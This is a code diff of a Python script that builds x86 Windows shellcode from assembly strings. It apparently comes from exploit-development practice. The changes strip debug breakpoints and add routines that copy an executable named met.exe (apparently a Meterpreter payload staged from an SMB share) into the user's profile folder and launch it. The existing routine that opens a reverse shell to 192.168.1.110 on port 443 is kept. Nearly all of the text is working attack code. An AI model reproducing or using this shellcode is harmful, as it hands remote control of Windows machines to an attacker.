@@ -6,7 +6,7 @@ def main():
     
     SHELLCODE = (
     " start:                             "  #
-    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
+      #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
     "   mov   ebp, esp                  ;"  #
     "   add   esp, 0xfffffdf0           ;"  #   Avoid NULL bytes
 
@@ -83,7 +83,7 @@ def main():
     " find_function_finished:            "  #
     "   popad                           ;"  #   Restore registers
     "   ret                             ;"  #
-    "   int3                            ;"
+    
                   
     " resolve_symbols_kernel32:          "
     "   push  0x78b5b983                ;"  #   TerminateProcess hash
@@ -95,8 +95,129 @@ def main():
     "   push  0x16b3fe72                ;"  #   CreateProcessA hash
     "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
     "   mov   [ebp+0x18], eax           ;"  #   Save CreateProcessA address for later usage
-    "   int3                            ;"
+    "   push 0xa4048954                 ;"  #   MoveFileA hash 
+    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
+    "   mov   [ebp+0x24], eax           ;"  #   Save MoveFileA hash
+    
+    
+    " load_kernelbase:                   "
+    "   xor   eax, eax                  ;"  #   NULL EAX
+    "   mov   ax, 0x6c6c                ;"
+    "   push  eax                       ;"
+    "   push  0x642e6573                ;"  #   Push EAX on the stack with string NULL terminator
+    "   push  0x61626c65                ;"  #   Push part of the string on the stack
+    "   push  0x6e72656b                ;"  #   Push another part of the string on the stack
+    "   push  esp                       ;"  #   Push ESP to have a pointer to the string
+    "   call dword ptr [ebp+0x14]       ;"  #   Call LoadLibraryA
+    
+    " resolve_symbols_kernelbase:        "
+    "   mov   ebx, eax                  ;"  #   Move the base address of kernelbase.dll to EBX
+    "   push 0x591ea70f                 ;"  #   OpenProcessToken hash
+    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
+    "   mov   [ebp+0x40], eax           ;"  #   Save OpenProcessToken hash
+    
+    " load_userenv:                      "
+    "   xor   eax, eax                  ;"  #   NULL EAX
+    "   push  0x006c6c64                ;"  #   Move the end of the string in AX
+    "   push  0x2e766e65                ;"  #   Push part of the string on the stack
+    "   push  0x72657375                ;"  #   Push another part of the string on the stack
+    "   push  esp                       ;"  #   Push ESP to have a pointer to the string
+    "   call dword ptr [ebp+0x14]       ;"  #   Call LoadLibraryA
+    
+    " resolve_symbols_userenv:           "
+    "   mov   ebx, eax                  ;"  #   Move the base address of userenv.dll to EBX
+    "   push 0xf2ea3914                 ;"  #   GetUserProfileDirectoryA hash
+    "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
+    "   mov   [ebp+0x32], eax           ;"  #   Save GetUserProfileDirectoryA hash
 
+    " call_open_process_token:           "
+    
+    "   lea  esi, [ebp+0x48]            ;"
+    "   push esi                        ;"  #   [ebp+0x48] = memory address for htoken
+    "   push 0x8                        ;"  #   Token query constant
+    "   push 0xffffffff                 ;"  #   Current Process Handle (-1)
+    "   call dword ptr [ebp+0x40]       ;"  #   Call OpenProcessToken()
+    "   mov  edi, [ebp+0x48]            ;"
+    
+    " call_getuserprofiledirectory:      "
+    "   mov dword ptr [ebp+0x1de], 0x104;"
+    "   lea eax, [ebp+0x1de]            ;"
+    "   push eax                        ;"  #   Push pointer to DWORD dirSize = 0x260
+    "   lea  ecx, [ebp+0x1e2]           ;"
+    "   push ecx                        ;"  #   Profile Directory Buffer
+    "   mov eax, [ebp+0x48]             ;"  #   load [ebp+0x48] = htoken memory address
+    "   push eax                        ;"  #   Push the actual handle, [ebp+0x48] = htoken memory address
+    "   call dword ptr [ebp+0x32]       ;"
+    
+    " call_MoveFileA:                          "  # MoveFile(source, destination)
+    
+    "   lea  ecx, [ebp+0x1e2]                 ;"
+    "   mov dword ptr [ebp+0x1f2], 0x74656d5c ;" # "tem\"
+    "   mov dword ptr [ebp+0x1f6], 0x6578652e ;" # "exe."
+    "   push ecx                              ;" # Destination file = profile directory + "C:\users\exploit\met.exe"
+    "   mov dword ptr [ebp+0x208], 0x5c5c3a43 ;" # Source File = C:\\Temp\met.exe
+    "   mov dword ptr [ebp+0x20c], 0x706d6554 ;"
+    "   mov dword ptr [ebp+0x210], 0x74656d5c ;" # tem\
+    "   mov dword ptr [ebp+0x214], 0x6578652e ;" # "exe."
+    "   lea eax, [ebp+0x208]            ;"
+    "   push eax                        ;"  # Source file = smbshare in C: "\\\\192.168.1.100\\shared\\met.txt";
+    "   call dword ptr [ebp+0x24]       ;"  # Call MoveFileA()
+    
+    
+    " create_startupinfo:                "  #
+    "   xor   eax, eax                       ;"  
+    "   push  eax                       ;"  #   Push hStdError
+    "   push  eax                       ;"  #   Push hStdOutput
+    "   push  eax                       ;"  #   Push hStdInput
+    "   push  eax                       ;"  #   Push lpReserved2
+    "   push  eax                       ;"  #   Push cbReserved2 & wShowWindow
+    "   mov   al, 0x80                  ;"  #   Move 0x80 to AL
+    "   xor   ecx, ecx                  ;"  #   NULL ECX
+    "   mov   cx, 0x80                  ;"  #   Move 0x80 to CX
+    "   add   eax, ecx                  ;"  #   Set EAX to 0x100
+    "   push  eax                       ;"  #   Push dwFlags
+    "   xor   eax, eax                  ;"  #   NULL EAX   
+    "   push  eax                       ;"  #   Push dwFillAttribute
+    "   push  eax                       ;"  #   Push dwYCountChars
+    "   push  eax                       ;"  #   Push dwXCountChars
+    "   push  eax                       ;"  #   Push dwYSize
+    "   push  eax                       ;"  #   Push dwXSize
+    "   push  eax                       ;"  #   Push dwY
+    "   push  eax                       ;"  #   Push dwX
+    "   push  eax                       ;"  #   Push lpTitle
+    "   push  eax                       ;"  #   Push lpDesktop
+    "   push  eax                       ;"  #   Push lpReserved
+    "   mov   al, 0x44                  ;"  #   Move 0x44 to AL        
+    "   push  eax                       ;"  #   Push cb        
+    "   push  esp                       ;"  #   Push pointer to the STARTUPINFOA structure
+    "   pop   edi                       ;"  #   Store pointer to STARTUPINFOA in EDI
+    
+    " call_createprocess:                "  #
+    "   mov   eax, esp                  ;"  #   Move ESP to EAX               
+    "   xor   ecx, ecx                  ;"  #   NULL ECX
+    "   mov   cx, 0x390                 ;"  #   Move 0x390 to CX
+    "   sub   eax, ecx                  ;"  #   Substract CX from EAX to avoid overwriting the structure later
+    "   push  eax                       ;"  #   Push lpProcessInformation
+    "   push  edi                       ;"  #   Push lpStartupInfo
+    "   xor   eax, eax                  ;"  #   NULL EAX   
+    "   push  eax                       ;"  #   Push lpCurrentDirectory
+    "   push  eax                       ;"  #   Push lpEnvironment
+    "   push  eax                       ;"  #   Push dwCreationFlags
+    "   inc   eax                       ;"  #   Increase EAX, EAX = 0x01 (TRUE) 
+    "   push  eax                       ;"  #   Push bInheritHandles
+    "   dec   eax                       ;"  #   NULL EAX
+    "   push  eax                       ;"  #   Push lpThreadAttributes
+    "   push  eax                       ;"  #   Push lpProcessAttributes
+    "   push  eax                       ;"  #   Push lpCommandLine
+    "   lea ebx, [ebp+0x1e2]            ;"         
+    "   push  ebx                       ;"  #   Push lpApplicationName
+    "   call dword ptr [ebp+0x18]       ;"  #   Call CreateProcessA
+    
+    " terminateprocess:                  "  #
+    "   push 0x0                        ;"  # Exit Code = 0
+    "   push 0xffffffff                 ;"  # Current process handle = -1
+    "   call dword ptr [ebp+0x10]       ;"  # Call terminateProcess()
+    
     " load_ws2_32:                       "  #
     "   xor   eax, eax                  ;"  #   NULL EAX
     "   mov   ax, 0x6c6c                ;"  #   Move the end of the string in AX
@@ -110,23 +231,24 @@ def main():
     "   mov   ebx, eax                  ;"  #   Move the base address of ws2_32.dll to EBX
     "   push  0x3bfcedcb                ;"  #   WSAStartup hash
     "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
-    "   mov   [ebp+0x1C], eax           ;"  #   Save WSAStartup address for later usage
+    "   mov   [ebp+0x52], eax           ;"  #   Save WSAStartup address for later usage
     "   push  0xadf509d9                ;"  #   WSASocketA hash
     "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
-    "   mov   [ebp+0x20], eax           ;"  #   Save WSASocketA address for later usage
+    "   mov   [ebp+0x60], eax           ;"  #   Save WSASocketA address for later usage
     "   push  0xb32dba0c                ;"  #   WSAConnect hash
     "   call dword ptr [ebp+0x04]       ;"  #   Call find_function
-    "   mov   [ebp+0x24], eax           ;"  #   Save WSAConnect address for later usage
+    "   mov   [ebp+0x68], eax           ;"  #   Save WSAConnect address for later usage
 
     " call_wsastartup:                   "  #
     "   mov   eax, esp                  ;"  #   Move ESP to EAX
-    "   mov   cx, 0x48                 ;"  #   Move 0x590 to CX
+    "   mov   ecx, 0x590                 ;"  #   Move 0x590 to CX
     "   sub   eax, ecx                  ;"  #   Substract CX from EAX to avoid overwriting the structure later
     "   push  eax                       ;"  #   Push lpWSAData
     "   xor   eax, eax                  ;"  #   NULL EAX
     "   mov   ax, 0x0202                ;"  #   Move version to AX
     "   push  eax                       ;"  #   Push wVersionRequired
-    "   call dword ptr [ebp+0x1C]       ;"  #   Call WSAStartup
+                       
+    "   call dword ptr [ebp+0x52]       ;"  #   Call WSAStartup
 
     " call_wsasocketa:                   "  #
     "   xor   eax, eax                  ;"  #   NULL EAX
@@ -139,14 +261,14 @@ def main():
     "   push  eax                       ;"  #   Push type
     "   inc   eax                       ;"  #   Increase EAX, EAX = 0x02
     "   push  eax                       ;"  #   Push af
-    "   call dword ptr [ebp+0x20]       ;"  #   Call WSASocketA
+    "   call dword ptr [ebp+0x60]       ;"  #   Call WSASocketA
 
     " call_wsaconnect:                   "  #
     "   mov   esi, eax                  ;"  #   Move the SOCKET descriptor to ESI
     "   xor   eax, eax                  ;"  #   NULL EAX
     "   push  eax                       ;"  #   Push sin_zero[]
     "   push  eax                       ;"  #   Push sin_zero[]
-    "   push  0x6e01a8c0                ;"  #   Push sin_addr (192.168.119.120)
+    "   push  0x6e01a8c0                ;"  #   Push sin_addr (192.168.1.110)
     "   mov   ax, 0xbb01                ;"  #   Move the sin_port (443) to AX
     "   shl   eax, 0x10                 ;"  #   Left shift EAX by 0x10 bytes
     "   add   ax, 0x02                  ;"  #   Add 0x02 (AF_INET) to AX
@@ -162,7 +284,7 @@ def main():
     "   push  eax                       ;"  #   Push namelen
     "   push  edi                       ;"  #   Push *name
     "   push  esi                       ;"  #   Push s
-    "   call dword ptr [ebp+0x24]       ;"  #   Call WSAConnect
+    "   call dword ptr [ebp+0x68]       ;"  #   Call WSAConnect
 
     " create_startupinfoa:               "  #
     "   push  esi                       ;"  #   Push hStdError
@@ -219,6 +341,11 @@ def main():
     "   push  ebx                       ;"  #   Push lpCommandLine
     "   push  eax                       ;"  #   Push lpApplicationName
     "   call dword ptr [ebp+0x18]       ;"  #   Call CreateProcessA
+    
+    " TerminateProcess:                  "  #
+    "   push 0x0                        ;"  # Exit Code = 0
+    "   push 0xffffffff                 ;"  # Current process handle = -1
+    "   call dword ptr [ebp+0x10]       ;"  # Call terminateProcess()
 )
 
     # Initialize engine in 64-Bit mode
